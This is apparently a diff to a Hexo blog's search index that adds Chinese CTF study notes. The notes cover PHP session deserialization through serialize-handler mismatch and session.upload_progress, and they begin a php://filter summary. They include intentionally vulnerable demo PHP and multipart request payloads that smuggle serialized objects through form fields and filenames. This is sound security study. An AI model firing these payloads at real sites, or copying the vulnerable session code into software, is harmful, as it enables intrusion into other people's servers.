@@ -440,7 +440,7 @@
   <entry>
     <title>Python内存马探究</title>
     <url>/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<p>比较重要</p>
+    <content><![CDATA[<p>比较重要，利用面挺广的</p>
 <span id="more"></span>
 
 <h1 id="Python内存马分析"><a href="#Python内存马分析" class="headerlink" title="Python内存马分析"></a>Python内存马分析</h1><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>常用的<code>Python</code>框架有<code>Django</code>、<code>Flask</code>, 这两者都可能存在<code>SSTI</code>漏洞. <code>Python内存马</code>利用<code>Flask</code>框架中<code>SSTI</code>注入来实现，<code>Flask</code>框架中在<code>web</code>应用模版渲染的过程用到**<code>render_template_string</code>**函数进行渲染, 但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现<code>Python</code>内存马的注入</p>
@@ -1291,9 +1291,475 @@
       </categories>
   </entry>
   <entry>
+    <title>session反序列化学习</title>
+    <url>/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>好用，爱用，多用</p>
+<span id="more"></span>
+
+<h4 id="PHP-session的说明"><a href="#PHP-session的说明" class="headerlink" title="PHP session的说明"></a>PHP session的说明</h4><h5 id="php-session的定义"><a href="#php-session的定义" class="headerlink" title="php session的定义"></a>php session的定义</h5><p><strong>先说明一下什么是Session：</strong><br><em>Session一般称为“会话控制”，简单来说就是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话</em>，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同。</p>
+<p><strong>PHP session：</strong></p>
+<p><u>PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更该用户会话的设置</u>，需要注意的是，**<code>PHP Session</code> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的*<em>，</em>且其对应的具体 <code>session</code> 值会存储于服务器端*，这也是与 <code>cookie</code>的主要区别，所以<code>seesion</code> 的安全性相对较高。</p>
+<h5 id="PHP-session的工作流程"><a href="#PHP-session的工作流程" class="headerlink" title="PHP session的工作流程"></a>PHP session的工作流程</h5><p>会话工作流程很简单，当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果发现请求的<code>Cookie</code>、<code>Get</code>、<code>Post</code>中不存在<code>session id</code>，PHP就会自动调用<code>php_session_create_id</code>函数创建一个新的会话,并且在<code>http response</code>中通过<strong>set-cookie头部发送给客户端保存</strong>。</p>
+<p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，php也可以自动将<code>session id</code>添加到url参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项。</p>
+<p><strong>会话开始后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中</strong>，如下述代码就是一个在<code>$_SESSION</code>变量中注册变量的例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;username&#x27;])) &#123;</span><br><span class="line">  $_SESSION[&#x27;username&#x27;] = &#x27;xianzhi&#x27; ;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存</strong></p>
+<p>默认情况下<em>，PHP 使用内置的文件会话保存管理器来完成<code>session</code>的保存，<strong>也可以通过配置项 <code>session.save_handler</code> 来修改所要采用的会话保存管理器</strong></em>。 <em>对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置</em>。可参考下图：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422113603242-17142857356101.png" alt="image-20240422113603242"></p>
+<h5 id="PHP-session在php-ini中的配置"><a href="#PHP-session在php-ini中的配置" class="headerlink" title="PHP session在php.ini中的配置"></a>PHP session在php.ini中的配置</h5><p><code>PHP session</code>在<code>php.ini</code>中主要存在以下配置项:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_handler=files     该配置主要设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数  这里表明session是以文件的方式来进行存储的</span><br><span class="line"></span><br><span class="line">session.serialize_handler=php       该配置主要设定用户自定义存储函数  这里表明session的默认序列话引擎使用的是php处理器引擎</span><br><span class="line"></span><br><span class="line">session.save_path=&quot;D:\PHP\phpStudy\PHPTutorial\tmp\tmp&quot; 该配置主要设置session的存储路径  这里表明所有的session文件都是存储在xampp/tmp下</span><br><span class="line"></span><br><span class="line">session.auto_start=0                表明默认不启动session</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>session.save_handler&#x3D;””</li>
+</ul>
+<p>​        <strong>该配置主要设定用户自定义存储函数</strong>，如果想使用PHP内置<code>session</code>存储机制之外的可以使用这个函数</p>
+<ul>
+<li><strong>session.serialize_handler</strong></li>
+</ul>
+<p><u>定义用来序列化&#x2F;反序列化的处理器名字，默认使用<code>php</code></u>，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述</p>
+<p>等<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-0">参考</a>，下面主要谈谈<code>session.serialize_handler</code>配置项。</p>
+<h4 id="PHP-session的处理器及如何利用"><a href="#PHP-session的处理器及如何利用" class="headerlink" title="PHP session的处理器及如何利用"></a>PHP session的处理器及如何利用</h4><p>上文中提到的PHP session的<strong>序列化机制是由<code>session.serialize_handler</code>来定义引擎的</strong>，引擎也就是php处理器，<em>而序列化后的字符串默认是以文件的方式存储</em>，<em>且存储的文件是由<code>sess_sessionid</code>来决定文件名的</em>，如下：</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202003456.png" alt="image-20240425202003456"></p>
+<p>当然这个文件名也不是不变的，如<code>Codeigniter</code>框架的 <code>session</code>存储的文件名为<code>ci_sessionSESSIONID</code>等。</p>
+<p>并且文件的内容始终是session值的序列化之后的内容。</p>
+<h5 id="利用函数先说明"><a href="#利用函数先说明" class="headerlink" title="利用函数先说明"></a>利用函数先说明</h5><p>1.PHP提供了<code>session.serialize_handler</code>配置的选项，可以用来定义要使用的处理器，默认是php，如果想要使用其他的就需要<strong>使用ini_set()函数</strong>，格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>2.要想使用session，第一步就是开启session，这也是session的第一阶段这是就需要使用<strong>session_start()函数</strong>。</p>
+<p><strong>这个函数的作用就是开启session</strong>，开启之后读取cookie信息判断是否存在session_id，<u>如果存在就是用这个session_id</u>，如果没有就会随机生成一个唯一的32位的session_id。通过这个session_id就可以绑定一个唯一的用户。</p>
+<p><strong>这个过程还会初始化<code>$SESSION</code>这个变量，但是有两种情况：</strong></p>
+<ul>
+<li><p><strong>若没有这个session文件</strong>，就会读取cookie信息的内容从而序列化数据创建<code>$_SESSION</code>变量并创建一个session文件；</p>
+</li>
+<li><p><strong>若存在session文件</strong>，读取session文件中的内容，把内容反序列化之后赋值到<code>$SESSION</code>这个变量中**，这个阶段还有一个特别关键的作用，还会判断那些session文件已经过期，调用gc进程，删除掉过期的session文件</p>
+</li>
+</ul>
+<p><a href="https://www.cnblogs.com/daijiandong/p/12070947.html">参考文章1</a>以及<a href="https://blog.csdn.net/cs23405/article/details/81297698">2</a></p>
+<h5 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h5><p><strong><code>sessin.serialize_handler</code>定义的引擎有三种</strong>，如下表所示：</p>
+<table>
+<thead>
+<tr>
+<th>处理器名称</th>
+<th>存储格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php</td>
+<td>键名+竖线+经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td>php_binary</td>
+<td>键名的长度对应的<strong>ASCII字符</strong>（如键长为35则对应<code>#</code>）+键名+经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td>php_serialize</td>
+<td>经过<code>serialize()</code>函数序列化处理的<strong>数组</strong></td>
+</tr>
+</tbody></table>
+<p><strong>注</strong>：从PHP 5.5.4起可以使用<code>php_serialize</code></p>
+<p><u>上述三种处理器中</u>，*<code>php_serialize</code>在内部简单地直接使用 <code>serialize/unserialize</code>函数*，并且不会有<code>php</code>和 <code>php_binary</code>所具有的限制。 使用较旧的序列化处理器导致<code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符(<code>|</code> 和 <code>!</code>) 。</p>
+<p>测试一下，demo如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="php"><a href="#php" class="headerlink" title="php"></a>php</h6><p>如图所示：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422192647948.png" alt="image-20240422192647948"></p>
+<p>解析一下：<br>序列化的结果为:<code>session|s:6:&quot;Fupanc&quot;;</code></p>
+<p>其中<code>session</code>为$_SESSION[‘session’]的键名，<code>|</code>为传入GET参数经过序列化后的值。</p>
+<h6 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h6><p>将指定处理器函数的参数php改为这个就行，为了方便看，将键名改长一些，（否则对应的ascii字符不可见)，测试结果如下</p>
+<p>demo改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;sessionseesionsessionsessionsession&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422193133901.png" alt="image-20240422193133901"></p>
+<p>两张图片可以对比一下</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200413609.png" alt="image-20240422200413609"></p>
+<p>序列化的结果为：<code>#sessionsessionsessionsessionsessions:6:&quot;Fupanc&quot;;</code></p>
+<p>解析一下：<br><code>#</code>即为长度为35在ascii对应的符号</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200554081.png" alt="image-20240422200554081"></p>
+<p><code>sessionsessionsessionsessionsessions</code>是键名,</p>
+<p><strong>注意：</strong>这里序列化后的结果会在原代码设置的键名后加一个s，测试了一下，无论大写为多少。</p>
+<p><code>6:&quot;Fupanc&quot;;</code>即为序列化后的字符串。</p>
+<h6 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h6><p>demo如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试结果：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422201421239.png" alt="image-20240422201421239"></p>
+<p>序列化结果为：<code>a:1:&#123;s:7:&quot;session&quot;;s:6:&quot;Fupanc&quot;;&#125;</code></p>
+<p>解析：<br><code>a:1</code>表示<code>$_SESSION</code>数组中有一个元素，或括号里面的内容即为传入GET参数经过序列化后的值。</p>
+<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><h6 id="自建环境测试"><a href="#自建环境测试" class="headerlink" title="自建环境测试"></a>自建环境测试</h6><p>建造一个环境，有两个文件，分别如下：</p>
+<p>flag.php：</p>
+<p>这个页面用于接受session的值</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>1.php：</p>
+<p>这个页面用于测试反序</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handller&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;haha&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>先访问1.php，输出</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203335935.png" alt="image-20240423203335935"></p>
+<p>这里开启了<code>session_start()</code>函数，可以在flag.php页面利用session变量进行反序列化。如下构造payload：</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202531645.png" alt="image-20240425202531645"></p>
+<p>再在flag.php页面传入这个参，但是需要在前面加上一个<code>|</code>，这是因为php处理器会把|前面的内容当做键，后面的内容才会被反序列化后赋值给session变量</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203811665.png" alt="image-20240423203811665"></p>
+<p>在电脑上看一看此时session的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;session&quot;;s:40:&quot;|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;diyici&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到成功写入，这是再访问以下1.php</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202506406.png" alt="image-20240425202506406"></p>
+<p>成功反序。</p>
+<p><strong>但是这里的局限性太大，有如下条件：</strong></p>
+<ul>
+<li>两个文件session引擎配置不同</li>
+<li>其中一个session可控</li>
+<li>两个文件同域</li>
+</ul>
+<p>这个只是一个简单的复现过程，真实题目应该不能自己传session进去，现在看看稍真实页面是如何打的。</p>
+<h6 id="利用session-upload-progress进行反序列化-方式一"><a href="#利用session-upload-progress进行反序列化-方式一" class="headerlink" title="利用session.upload_progress进行反序列化-方式一"></a>利用session.upload_progress进行反序列化-方式一</h6><p>结合下述Session上传进度，<strong>这个方法需要php≥5.4</strong></p>
+<p><a href="https://bugs.php.net/bug.php?id=71101">漏洞官方说明</a></p>
+<p>这个漏洞条件官方说的挺清楚的，简单说明一下使用这个方法的条件</p>
+<p>条件：</p>
+<ol>
+<li><code>session.upload_progress.enabled = On</code>（是否启用上传进度报告）</li>
+<li><code>session.upload_progress.cleanup = Off</code>（是否上传完成之后删除session文件-这里需要为Off）</li>
+</ol>
+<p>这两个都是可在查的</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423211803946.png" alt="image-20240423211803946"></p>
+<p><strong>当enabled被设置为on时，此时再往服务器中上传一个文件时，PHP会把该文件的详细信息（如上传时间、上传进度等）存储到session，所以上传文件进度的报告就会以写入到session文件中</strong>，所以我们<u>可以设置一个与<code>session.upload_progress.name</code>同名的变量(默认名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>)，PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据</u>。我们就可以控制这个数据内容为我们的恶意payload</p>
+<p><strong>对session上传进度说明一下：</strong></p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/1647333728_62305160591d530edf695.jpeg" alt="image-20220315161551104"></p>
+<p>但是需要自己构造一个<strong>文件上传表单</strong>，代码如下：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>，在上传文件(必须上传)时抓包，直接借用官方的说明，有两种改法（第二种待验证）来进行反序：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-POST_RAW--</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------20896060251896012921717172737</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHPSESSID&quot;</span><br><span class="line"></span><br><span class="line">session-data-injection</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">|xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxO:3:&quot;obj&quot;:0:&#123;&#125;</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;file.txt&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------20896060251896012921717172737--</span><br></pre></td></tr></table></figure>
+
+<p>第一个就是上述官方改法，还有一个是在<a href="https://www.freebuf.com/articles/web/324943.html">文章</a>里看到可以改将filename那个file.txt改成payload(文章基本都是这样改的，在值里面改肯能会应该出现|导致数据写入session失败)</p>
+<p><strong>但是文件名需要注意防止引号被转义同时也是为了防止与最外层的双引号冲突</strong>，需要使用\来说明，借用文章代码说明一下（待验证-还是很多文章都在用这种改法）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357--</span><br></pre></td></tr></table></figure>
+
+<p><strong>上传成功就可以直接在Index.php页面利用这个payload</strong></p>
+<h6 id="利用session-upload-progress进行反序列化-方式二"><a href="#利用session-upload-progress进行反序列化-方式二" class="headerlink" title="利用session.upload_progress进行反序列化-方式二"></a>利用session.upload_progress进行反序列化-方式二</h6><p><strong>同样需要php≥5.4</strong></p>
+<p>这个方法着重于解决当配置如下使如何解决,一般这个是php.ini的默认项：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这里与上面的最主要的区别就是<code>session.upload_progress.cleanup = on</code>，<u>表示当文件上传结束后，php将会立即清空对应session文件中的内容</u>，也就代表我们每次<strong>正常访问</strong>session文件时都是<strong>空文件</strong>。所以想要利用就需要竞争。</p>
+<p><strong>如果cleanup被设置为On，就需要使用条件竞争</strong></p>
+<p>&#x3D;&#x3D;还有一个比较重要的配置：&#x3D;&#x3D;<br><code>session.use_strict_mode=off</code>，这个选项默认值为off，表示我们对cookie中的sessionid可控。这一点很重要。</p>
+<p>开始解析：</p>
+<ul>
+<li>配置文件中的<code>session.use_strict_mode</code>默认为0时，这个情况下，用户可以定义自己的sessionid，例如当用户在cookie中设置<code>sessionid=Lxxx</code>时，PHP就会生成一个文件<code>/tmp/sess_Lxxx</code>，此时也就初始化了session，并且会将上传的文件信息写入到文件<code>/tmp/sess_Lxxx</code>中去。</li>
+<li>由于<strong>在这种情况下cleanup的值为on</strong>，所以文件上传成功后文件内容会马上被清空，此时就需要利用Python的多线程来条件竞争</li>
+</ul>
+<p>脚本后面补，遇到题再搓出来。</p>
+<p>参考文章:<code>https://www.freebuf.com/vuls/202819.html</code></p>
+<p>其他例题参考：<br>1.简单过程说明以及其他ctf题解<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-9">文章</a></p>
+]]></content>
+      <categories>
+        <category>php相关漏洞</category>
+        <category>php反序列化</category>
+        <category>session反序列化</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>filter过滤器利用总结</title>
+    <url>/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>最近打比赛都遇到了这种考点，这里在学习后总结一下。</p>
+<span id="more"></span>
+
+<h3 id="对php-filter的说明"><a href="#对php-filter的说明" class="headerlink" title="对php://filter的说明"></a>对<code>php://filter</code>的说明</h3><h5 id="基本说明"><a href="#基本说明" class="headerlink" title="基本说明"></a>基本说明</h5><p><code>php://filter</code>是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。</p>
+<p>基本格式为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=?/resource=?</span></span><br></pre></td></tr></table></figure>
+
+<p>说明：</p>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource</td>
+<td>在<code>php://filter</code>中，<code>resource</code>参数是必须的。<code>resource</code>用于指定<code>需要进行筛选过滤的数据流</code></td>
+</tr>
+<tr>
+<td>read</td>
+<td><code>read</code>参数指定<code>一个或多个过滤器</code>用于<code>读</code>操作，多个过滤器之间以管道符&#96;</td>
+</tr>
+<tr>
+<td>write</td>
+<td><code>write</code>参数指定<code>一个或多个过滤器</code>用于<code>写</code>操作，多个过滤器之间以管道符&#96;</td>
+</tr>
+<tr>
+<td>无read或write为前缀</td>
+<td>任何没有以read&#x3D;或write&#x3D;作前缀的筛选器列表会视情况应用于读或写链</td>
+</tr>
+</tbody></table>
+<p>注意：任何没有与<code>read=</code>或<code>write=</code>作前缀的筛选器列表会<code>视情况应用于读或写操作</code>。这意味着在指定筛选器的过程中，<code>read</code>与<code>write</code>参数可被忽略。</p>
+<h5 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h5><p>以<code>file_get_contents()</code>函数为例：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/resource=haha.txt&#x27;</span>);</span><br><span class="line"><span class="comment">#flag&#123;123ahdiuahd&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=haha.txt&#x27;</span>);</span><br><span class="line"><span class="comment">#ZmxhZ3sxMjNhaGRpdWFoZH0=</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://filter/read=string.rot13/resource=haha.txt&#x27;</span>);</span><br><span class="line"><span class="comment">#synt&#123;123nuqvhnuq&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>以<code>file_put_contents()</code>函数为例:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/resource=11.txt&#x27;</span>,<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line"><span class="comment">#11.txt文件内容：hello world</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/write=convert.base64-encode/resource=12.txt&#x27;</span>,<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line"><span class="comment">#12.txt文件内容：aGVsbG8gd29ybGQ=</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;php://filter/write=string.rot13/resource=13.txt&#x27;</span>,<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line"><span class="comment">#13.txt文件内容：uryyb jbeyq</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="重要过滤器"><a href="#重要过滤器" class="headerlink" title="重要过滤器"></a><strong>重要过滤器</strong></h5><h6 id="string-strip-tags："><a href="#string-strip-tags：" class="headerlink" title="string.strip_tags："></a>string.strip_tags：</h6><p>简单说明：</p>
